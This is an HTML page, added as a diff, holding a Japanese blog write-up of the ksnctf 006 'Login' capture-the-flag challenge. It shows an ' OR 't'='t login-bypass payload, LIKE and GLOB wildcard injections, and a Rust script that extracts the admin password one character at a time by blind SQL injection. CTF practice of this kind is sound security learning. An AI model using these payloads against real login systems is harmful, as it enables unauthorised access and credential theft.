@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="jp">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>ksnctf 006 Login | 逝く道</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="ksnctf 006 Login" />
+<meta property="og:locale" content="jp" />
+<meta name="description" content="どこまでも逝こう。" />
+<meta property="og:description" content="どこまでも逝こう。" />
+<link rel="canonical" href="/contents/tech/ctf_ksnctf/2021/05/21/006.html" />
+<meta property="og:url" content="/contents/tech/ctf_ksnctf/2021/05/21/006.html" />
+<meta property="og:site_name" content="逝く道" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-21T12:38:04+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ksnctf 006 Login" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-21T12:38:04+00:00","datePublished":"2021-05-21T12:38:04+00:00","description":"どこまでも逝こう。","headline":"ksnctf 006 Login","mainEntityOfPage":{"@type":"WebPage","@id":"/contents/tech/ctf_ksnctf/2021/05/21/006.html"},"url":"/contents/tech/ctf_ksnctf/2021/05/21/006.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="逝く道" /><!-- Global site tag (gtag.js) - Google Analytics -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y8XBTJHM0K"></script>
+      <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-Y8XBTJHM0K');
+      </script></head> 
+
+  
+
+  <body><header class="site-header" role="banner">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">逝く道</a>
+    
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <div class="trigger"><a class="page-link" href="/diary/">Diary</a><a class="page-link" href="/tech/">Tech</a><a class="page-link" href="/novel/">Novel</a><a class="page-link" href="/memo/">Memo</a><a class="page-link" href="/junk/">Junk</a><a class="page-link" href="/about/">About</a></div>
+
+    </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">ksnctf 006 Login</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-05-21T12:38:04+00:00" itemprop="datePublished">May 21, 2021
+        
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <details>
+        <summary>目次</summary><ul><li><a href="#ksnctf-006-login">ksnctf 006 Login</a><ul><li><a href="#謎解き">謎解き</a></li><li><a href="#適当に">適当に</a></li><li><a href="#特定する">特定する</a></li><li><a href="#like-ではなく-glob">LIKE ではなく GLOB</a></li><li><a href="#ブルートフォース">ブルートフォース</a></li><li><a href="#おしまい">おしまい</a></li></ul></li><li><a href="#所感">所感</a></li></ul></details>
+    <h2 id="ksnctf-006-login">ksnctf 006 Login</h2>
+<ul>
+  <li>問題公開日: 2012/05/26</li>
+  <li>ジャンル: web</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+<p>　正しい <code class="language-plaintext highlighter-rouge">admin</code> <code class="language-plaintext highlighter-rouge">pass</code> を入れる問題だ。</p>
+
+<p>　と言っても特別ヒントはない。が、これはおそらく <code class="language-plaintext highlighter-rouge">SQLインジェクション</code> と呼ばれる脆弱性を突く問題だろう。</p>
+
+<p>　ユーザーの管理は基本的にDB管理しているものだろう。となれば、ブラウザからの入力を受けて SQL を発行していると考えられる。</p>
+
+<p>　この時、入力を通して、意図しない動作をユーザーが任意に行える場合がある。</p>
+
+<p>　ということで、その方針で進めてみる。</p>
+
+<h3 id="適当に">適当に</h3>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">admin</span><span class="pi">:</span> <span class="s">admin</span>
+<span class="na">pass</span><span class="pi">:</span> <span class="s1">'</span><span class="nv"> </span><span class="s">OR</span><span class="nv"> </span><span class="s">'t' = 't</span>
+</code></pre></div></div>
+
+<p>　と入れてみると、見事に画面が切り替わる。</p>
+
+<p>　そこに寄れば、「<code class="language-plaintext highlighter-rouge">admin</code> のパスワードこそがフラグだ」と記されている。</p>
+
+<p>　このページから分かることは様々あるが、重要なことは。</p>
+
+<p>　まず、DBは <code class="language-plaintext highlighter-rouge">sqlite</code> である</p>
+
+<p>　次に、クエリの構成が以下である。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'$id'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">'$pass'</span>
+</code></pre></div></div>
+
+<p>　先ほどの入力はつまり、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="s1">'t'</span> <span class="o">=</span> <span class="s1">'t'</span>
+</code></pre></div></div>
+
+<p>　となっていたからSQLが通ったわけである。 OR 以降が必ず true になるため。</p>
+
+<p>　さて、これらを踏まえて、早速 <code class="language-plaintext highlighter-rouge">admin</code> のパスワードを特定しよう。</p>
+
+<p>　id については <code class="language-plaintext highlighter-rouge">admin</code> で間違いないが、 pass をどうやって特定しようか。</p>
+
+<h3 id="特定する">特定する</h3>
+
+<p>　色々考えたが、結局ブルートフォース案しか浮かばなかったので、それにする。</p>
+
+<p>　SQLにはワイルドカードを利用出来る。即ち、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="k">LIKE</span> <span class="s1">'%'</span>
+</code></pre></div></div>
+
+<p>　という指定の仕方だ。 <code class="language-plaintext highlighter-rouge">%</code> は LIKE におけるワイルドカードであり、0文字以上の文字とヒットする。従って、上記のSQLは確実に通る。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">_</code> もあり、これは任意の1文字とヒットする。</p>
+
+<p>　これを使って、文字数を特定できる。一文字ずつ <code class="language-plaintext highlighter-rouge">_</code> を増やして入力を試してみると、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- pass の長さは 21文字</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="k">LIKE</span> <span class="s1">'_____________________'</span>
+</code></pre></div></div>
+
+<p>　であることが分かった。上記のSQLは通る。</p>
+
+<p>　また、フラグの形式は <code class="language-plaintext highlighter-rouge">FLAG_......</code> であることも踏まえると、以下まで確定する。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- `FLAG_` を除いた pass の長さは 16文字</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="k">LIKE</span> <span class="s1">'FLAG_________________'</span>
+</code></pre></div></div>
+
+<p>　FLAGに使われる文字は <code class="language-plaintext highlighter-rouge">[a-z]</code> <code class="language-plaintext highlighter-rouge">[A-Z]</code> <code class="language-plaintext highlighter-rouge">[0-9]</code> の62文字であり、ブルートフォースを仕掛けた場合、 62文字 * 16文字 = 992文字 である。それほど多くはない。</p>
+
+<p>　というわけで何とかなりそうである。</p>
+
+<h3 id="like-ではなく-glob">LIKE ではなく GLOB</h3>
+
+<p>　実は <code class="language-plaintext highlighter-rouge">sqlite</code> の <code class="language-plaintext highlighter-rouge">LIKE</code> は大文字と小文字を区別してくれない。</p>
+
+<p>　そのため、ブルートフォースを仕掛ける前にSQLを修正する必要がある。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">LIKE</code> ではなく <code class="language-plaintext highlighter-rouge">GLOB</code> を使うようにするということだ。</p>
+
+<p>　パターンマッチングを利用する <code class="language-plaintext highlighter-rouge">GLOB</code> を用いる。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>LIKE</th>
+      <th>GLOB</th>
+      <th>説明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">%</code></td>
+      <td><code class="language-plaintext highlighter-rouge">*</code></td>
+      <td>任意の0文字以上</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">_</code></td>
+      <td><code class="language-plaintext highlighter-rouge">?</code></td>
+      <td>任意の1文字</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　<code class="language-plaintext highlighter-rouge">GLOB</code> では <code class="language-plaintext highlighter-rouge">%</code> の代わりに <code class="language-plaintext highlighter-rouge">*</code> を、<code class="language-plaintext highlighter-rouge">_</code> の代わりに <code class="language-plaintext highlighter-rouge">?</code> を使う。従って、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- GLOB ver</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="n">GLOB</span> <span class="s1">'FLAG_????????????????'</span>
+</code></pre></div></div>
+
+<p>　となる。</p>
+
+<p>　これで抑えるべき事項は全てだ。</p>
+
+<p>　後はブルートフォースを仕掛けるだけだ。手作業だと大変なので、プログラムで行う。</p>
+
+<p>　毎度お馴染みRustの時間である。</p>
+
+<h3 id="ブルートフォース">ブルートフォース</h3>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="k">crate</span> <span class="n">reqwest</span><span class="p">;</span>
+
+<span class="nd">#[tokio::main]</span>
+<span class="k">async</span> <span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="nn">std</span><span class="p">::</span><span class="nn">error</span><span class="p">::</span><span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">strings</span> <span class="o">=</span> <span class="p">[</span><span class="s">"a"</span><span class="p">,</span><span class="s">"b"</span><span class="p">,</span><span class="s">"c"</span><span class="p">,</span><span class="s">"d"</span><span class="p">,</span><span class="s">"e"</span><span class="p">,</span><span class="s">"f"</span><span class="p">,</span><span class="s">"g"</span><span class="p">,</span><span class="s">"h"</span><span class="p">,</span><span class="s">"i"</span><span class="p">,</span><span class="s">"j"</span><span class="p">,</span><span class="s">"k"</span><span class="p">,</span><span class="s">"l"</span><span class="p">,</span><span class="s">"m"</span><span class="p">,</span><span class="s">"n"</span><span class="p">,</span><span class="s">"o"</span><span class="p">,</span><span class="s">"p"</span><span class="p">,</span><span class="s">"q"</span><span class="p">,</span><span class="s">"r"</span><span class="p">,</span><span class="s">"s"</span><span class="p">,</span><span class="s">"t"</span><span class="p">,</span><span class="s">"u"</span><span class="p">,</span><span class="s">"v"</span><span class="p">,</span><span class="s">"w"</span><span class="p">,</span><span class="s">"x"</span><span class="p">,</span><span class="s">"y"</span><span class="p">,</span><span class="s">"z"</span><span class="p">,</span><span class="s">"A"</span><span class="p">,</span><span class="s">"B"</span><span class="p">,</span><span class="s">"C"</span><span class="p">,</span><span class="s">"D"</span><span class="p">,</span><span class="s">"E"</span><span class="p">,</span><span class="s">"F"</span><span class="p">,</span><span class="s">"G"</span><span class="p">,</span><span class="s">"H"</span><span class="p">,</span><span class="s">"I"</span><span class="p">,</span><span class="s">"J"</span><span class="p">,</span><span class="s">"K"</span><span class="p">,</span><span class="s">"L"</span><span class="p">,</span><span class="s">"M"</span><span class="p">,</span><span class="s">"N"</span><span class="p">,</span><span class="s">"O"</span><span class="p">,</span><span class="s">"P"</span><span class="p">,</span><span class="s">"Q"</span><span class="p">,</span><span class="s">"R"</span><span class="p">,</span><span class="s">"S"</span><span class="p">,</span><span class="s">"T"</span><span class="p">,</span><span class="s">"U"</span><span class="p">,</span><span class="s">"V"</span><span class="p">,</span><span class="s">"W"</span><span class="p">,</span><span class="s">"X"</span><span class="p">,</span><span class="s">"Y"</span><span class="p">,</span><span class="s">"Z"</span><span class="p">,</span><span class="s">"0"</span><span class="p">,</span><span class="s">"1"</span><span class="p">,</span><span class="s">"2"</span><span class="p">,</span><span class="s">"3"</span><span class="p">,</span><span class="s">"4"</span><span class="p">,</span><span class="s">"5"</span><span class="p">,</span><span class="s">"6"</span><span class="p">,</span><span class="s">"7"</span><span class="p">,</span><span class="s">"8"</span><span class="p">,</span><span class="s">"9"</span><span class="p">];</span>
+
+    <span class="nd">eprintln!</span><span class="p">(</span><span class="s">"*** 開始 ***"</span><span class="p">);</span>
+    
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">prefix</span><span class="p">:</span> <span class="nb">String</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">from</span><span class="p">(</span><span class="s">"' OR pass GLOB 'FLAG_"</span><span class="p">);</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">suffix</span> <span class="o">=</span> <span class="s">"*"</span><span class="p">;</span>
+    
+    <span class="k">for</span> <span class="n">number</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="mi">17</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="n">number</span> <span class="o">==</span> <span class="mi">16</span> <span class="p">{</span> <span class="n">suffix</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="k">in</span> <span class="n">strings</span><span class="nf">.iter</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">pass</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"{}{}{}"</span><span class="p">,</span> <span class="n">prefix</span><span class="nf">.to_string</span><span class="p">(),</span> <span class="n">s</span><span class="p">,</span> <span class="n">suffix</span><span class="p">);</span>
+            <span class="k">let</span> <span class="n">params</span> <span class="o">=</span> <span class="p">[(</span><span class="s">"id"</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">),</span> <span class="p">(</span><span class="s">"pass"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pass</span><span class="p">)];</span>
+            <span class="k">let</span> <span class="n">client</span> <span class="o">=</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">Client</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+            <span class="k">let</span> <span class="n">res</span> <span class="o">=</span> <span class="n">client</span><span class="nf">.post</span><span class="p">(</span><span class="s">"https://ctfq.u1tramarine.blue/q6/index.php"</span><span class="p">)</span>
+                <span class="nf">.form</span><span class="p">(</span><span class="o">&amp;</span><span class="n">params</span><span class="p">)</span>
+                <span class="nf">.send</span><span class="p">()</span>
+                <span class="k">.await</span><span class="o">?</span><span class="p">;</span>
+
+            <span class="c1">// println!("{:#?}", res);</span>
+            
+            <span class="k">if</span> <span class="n">res</span><span class="nf">.content_length</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nf">Some</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nd">println!</span><span class="p">(</span><span class="s">"{}: {:?}{}"</span><span class="p">,</span> <span class="n">number</span><span class="p">,</span> <span class="n">res</span><span class="nf">.content_length</span><span class="p">(),</span> <span class="n">pass</span><span class="p">);</span>
+                <span class="n">prefix</span><span class="nf">.push_str</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nd">eprintln!</span><span class="p">(</span><span class="s">"*** next ***"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nd">eprintln!</span><span class="p">(</span><span class="s">"*** 終了 ***"</span><span class="p">);</span>
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">FLAG_*</code> <code class="language-plaintext highlighter-rouge">FLAG_A*</code> <code class="language-plaintext highlighter-rouge">FLAG_AA*</code> のように0文字以上マッチ<code class="language-plaintext highlighter-rouge">*</code>を末尾につけながら、一文字ずつ特定している。</p>
+
+<p>　丁度良い指標が無かったので、 <code class="language-plaintext highlighter-rouge">content_length</code> を使った。失敗した時のコンテンツの長さは 500 程度で、成功する 2200 程度だったので、これを元に正しいかどうかを判定した。</p>
+
+<p>　Rust スキルも徐々に向上していて良い。良い。</p>
+
+<h3 id="おしまい">おしまい</h3>
+
+<p>　無事にFLAGをゲットできた。おしまい。</p>
+
+<h2 id="所感">所感</h2>
+
+<p>　今回は問題を見た時に謎が分かってしまったため、ささっと出来てしまった。</p>
+
+<p>　しいて謎となったのは、以下2点である。</p>
+
+<ul>
+  <li>pass をどうやって特定しようかという点</li>
+  <li>GLOB 句を探し当てるという点</li>
+</ul>
+
+<p>　LIKE 句で上手くいかなくてそこで <code class="language-plaintext highlighter-rouge">mysql</code> じゃないということに気付いたのだから、なめていたと言われてもしょうがない。</p>
+
+<p>　とはいえ、謎が分かったとしても実際に攻撃を仕掛けられるかどうかは違うわけで、ちゃんとFLAGを取れたのは良かった。</p>
+
+<p>　しかし、ブルートフォースで良かったのだろうか。SQL文をあれこれしたら案外SELECT文で取れたりしたのだろうか。まあきっとそれもおいおい分かるに違いない。似た別の問題に出会った時にこの謎は解ける。</p>
+
+<p>　ではこのへんで。
+　</p>
+
+  </div><a class="u-url" href="/contents/tech/ctf_ksnctf/2021/05/21/006.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-text">逝く道 | subscribe <a href="/feed.xml">via RSS</a> |どこまでも逝こう。</div></div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
